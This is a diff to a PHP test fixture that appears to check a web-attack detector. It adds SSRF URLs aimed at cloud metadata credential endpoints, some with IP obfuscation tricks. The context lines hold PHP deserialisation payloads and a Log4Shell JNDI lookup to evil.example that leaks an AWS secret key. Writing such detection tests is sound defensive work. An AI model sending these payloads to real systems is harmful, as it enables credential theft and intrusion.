@@ -141,6 +141,15 @@ return [
             ['/?d=a:1:%7Bi:0;O:24:%22GuzzleHttp\\Psr7\\FnStream%22:1:%7Bs:1:%22x%22;i:1;%7D%7D', [], 'ATK-PHP-OBJ'],   // inside an array, namespaced
             ['/?d=O:8:%22stdClass%22:%2B0:%7B%7D', [], 'ATK-PHP-OBJ'],                    // a sign on the count of properties: PHP takes it
             ['/?d=O:8:%22stdClass%22:00001:%7B%7D', [], 'ATK-PHP-OBJ'],                   // leading zeros
+            ['/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', [], 'ATK-SSRF-META'],   // AWS, Azure, OpenStack
+            ['/fetch?url=http://metadata.google.internal/computeMetadata/v1/', [], 'ATK-SSRF-META'],
+            ['/fetch?url=http://100.100.100.200/latest/meta-data/', [], 'ATK-SSRF-META'],     // Alibaba
+            ['/fetch?url=http://169.254.170.2/v2/credentials', [], 'ATK-SSRF-META'],          // ECS task role
+            ['/fetch?url=http://[fd00:ec2::254]/latest/', [], 'ATK-SSRF-META'],               // AWS over IPv6
+            ['/fetch?url=http://[::ffff:a9fe:a9fe]/latest/', [], 'ATK-SSRF-META'],            // the same address, mapped
+            ['/fetch?url=http://2852039166/latest/', [], 'ATK-SSRF-META'],                    // as one number
+            ['/fetch?url=http://0xa9fea9fe/latest/', [], 'ATK-SSRF-META'],                    // in hex
+            ['/fetch?url=http://user@0251.0376.0251.0376/', [], 'ATK-SSRF-META'],             // in octal, after a user
             ['/?d=C:11:%22ArrayObject%22:21:%7Bx:i:0;a:0:%7B%7D;m:a:0:%7B%7D%7D', [], 'ATK-PHP-OBJ'],   // a custom-serialised one
             ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
             ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
@@ -197,6 +206,9 @@ return [
             '/?q={{#each items}}',                   // Handlebars: no call, no *
             '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
             '/?t=10:30:00&o=1',                      // times, a parameter called o
+            '/fetch?url=https://www.example.org/feed',   // an ordinary address
+            '/?id=2852039166',                       // a number on its own, not an address
+            '/?ip=169.254.10.20',                    // another link-local address
             '/?q=information about cookies',         // not information_schema
             '/?q=load file into outfile tutorial',   // the words, no quote, no bracket
             '/?q=extract value from json',           // extractvalue( needed
